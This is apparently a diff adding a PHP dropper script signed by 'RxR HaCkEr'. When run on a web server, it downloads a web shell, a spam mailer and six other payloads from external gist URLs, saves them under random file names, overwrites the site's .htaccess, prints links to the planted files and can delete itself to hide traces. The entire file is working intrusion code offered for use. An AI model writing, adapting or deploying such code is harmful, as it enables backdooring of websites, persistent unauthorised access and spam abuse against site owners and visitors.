@@ -1,0 +1,107 @@
+<?php
+# Coded By RxR HaCkEr
+
+function Domain(){
+    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    $hostUrl = $protocol . '://' . $host;
+    return $hostUrl;
+}
+
+function generateRandomName($length = 8) {
+    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $randomName = '';
+
+    for ($i = 0; $i < $length; $i++) {
+        $randomName .= $characters[random_int(0, strlen($characters) - 1)];
+    }
+
+    return $randomName;
+}
+
+$hostdomain = Domain();
+$currentDirectory = dirname(__FILE__);
+
+// Generate random names for all files
+$randomNameFileshell  = generateRandomName(8) . '.php';
+$randomNameFilemailer  = generateRandomName(7) . '.php';
+$randomNameFileHtaccess = generateRandomName(6) . '.php'; // Will be renamed to .htaccess
+$randomNameFileLink1 = generateRandomName(8) . '.php';
+$randomNameFileLink2 = generateRandomName(8) . '.php';
+$randomNameFileLink3 = generateRandomName(8) . '.php';
+$randomNameFileLink4 = generateRandomName(8) . '.php';
+$randomNameFileLink5 = generateRandomName(8) . '.php';
+$randomNameFileLink6 = generateRandomName(8) . '.php';
+
+// Create shell file
+$shellPath = $currentDirectory . '/' . $randomNameFileshell;
+$contet_shell = file_get_contents('https://gist.githubusercontent.com/xsa404132/9e62620b45d5c25930ee129ca7ea7a67/raw/43aaf4d7ac173be9d3d8e203320efb0ed0b38844/gistfile1.txt');
+file_put_contents($shellPath, $contet_shell);
+
+// Create mailer file
+$mailerPath = $currentDirectory . '/' . $randomNameFilemailer;
+$contet_mailer = file_get_contents('https://gist.githubusercontent.com/xsa404132/5af6aa6b6de03110b0af2a20373669f4/raw/26fb95b63ffa0e835c11b1749a39b8b58252314e/gistfile1.txt');
+file_put_contents($mailerPath, $contet_mailer);
+
+// Create htaccess file
+$htaccessTempPath = $currentDirectory . '/' . $randomNameFileHtaccess;
+$contet_htaccess = file_get_contents('https://gist.githubusercontent.com/xsa404132/db468060a889bed3cc52293b4467f9c3/raw/dda0a9e9411ce6e23990cb5ba099b09f35e1e21a/gistfile1.txt');
+file_put_contents($htaccessTempPath, $contet_htaccess);
+
+// Create additional files
+$link1Path = $currentDirectory . '/' . $randomNameFileLink1;
+$content_link1 = file_get_contents('https://gist.githubusercontent.com/xsa404132/7d99348bccd2b68198b22697be4001df/raw/b1a91a95051f5a9283938be6c168ee56e5ecd198/gistfile1.txt');
+file_put_contents($link1Path, $content_link1);
+
+$link2Path = $currentDirectory . '/' . $randomNameFileLink2;
+$content_link2 = file_get_contents('https://gist.githubusercontent.com/xsa404132/8043eff79701e5ae7a0598142773befd/raw/4b4d38151ceb31f61685b8f62dc89b2788eb16b2/gistfile1.txt');
+file_put_contents($link2Path, $content_link2);
+
+$link3Path = $currentDirectory . '/' . $randomNameFileLink3;
+$content_link3 = file_get_contents('https://gist.githubusercontent.com/xsa404132/7331b4b6c860ab468b669943f47e3180/raw/34b9f03109d46253e64a7a65cc9b60d28ad797ef/gistfile1.txt');
+file_put_contents($link3Path, $content_link3);
+
+$link4Path = $currentDirectory . '/' . $randomNameFileLink4;
+$content_link4 = file_get_contents('https://gist.githubusercontent.com/xsa404132/111483d13283533b53f5e64a77ba2f81/raw/6a6fb0d6c7aa8dd022b2333c2ec69bbec4ed7876/gistfile1.txt');
+file_put_contents($link4Path, $content_link4);
+
+$link5Path = $currentDirectory . '/' . $randomNameFileLink5;
+$content_link5 = file_get_contents('https://gist.githubusercontent.com/xsa404132/5f0ed6f5a58e5502d6561506da78b52a/raw/91b92f92e7bd4c079032b1fa3e4926a9a8ce02be/gistfile1.txt');
+file_put_contents($link5Path, $content_link5);
+
+$link6Path = $currentDirectory . '/' . $randomNameFileLink6;
+$content_link6 = file_get_contents('https://gist.githubusercontent.com/xsa404132/3588ead9b2c8ef8b917b97c6e8b92e22/raw/d0b3f7c88c8b8dd64daafae96a488dae433fcc6f/gistfile1.txt');
+file_put_contents($link6Path, $content_link6);
+
+// Rename the htaccess file to .htaccess
+$htaccessFinalPath = $currentDirectory . '/.htaccess';
+if (file_exists($htaccessTempPath)) {
+    rename($htaccessTempPath, $htaccessFinalPath);
+}
+
+// Generate URLs
+$urlshell = $hostdomain . '/' . $randomNameFileshell;
+$urlmailer = $hostdomain . '/' . $randomNameFilemailer;
+$urlhtaccess = $hostdomain . '/.htaccess';
+$urllink1 = $hostdomain . '/' . $randomNameFileLink1;
+$urllink2 = $hostdomain . '/' . $randomNameFileLink2;
+$urllink3 = $hostdomain . '/' . $randomNameFileLink3;
+$urllink4 = $hostdomain . '/' . $randomNameFileLink4;
+$urllink5 = $hostdomain . '/' . $randomNameFileLink5;
+$urllink6 = $hostdomain . '/' . $randomNameFileLink6;
+
+// Display all URLs
+echo "shell -------> : <b><shell>$urlshell</shell></b></br>";
+echo "Mailer ------> : <b><mailer>$urlmailer</mailer></b></br>";
+echo ".htaccess ---> : <b><htaccess>$urlhtaccess</htaccess></b></br>";
+echo "Link 1xl ------> : <b><link1>$urllink1</link1></b></br>";
+echo "Link 2xl ------> : <b><link2>$urllink2</link2></b></br>";
+echo "Link 3 ------> : <b><link3>$urllink3</link3></b></br>";
+echo "Link 4fre ------> : <b><link4>$urllink4</link4></b></br>";
+echo "Link 5s ------> : <b><link5>$urllink5</link5></b></br>";
+echo "Link 6f ------> : <b><link6>$urllink6</link6></b></br>";
+
+if(isset($_GET['unback'])){
+    unlink(__FILE__);
+}
+?>
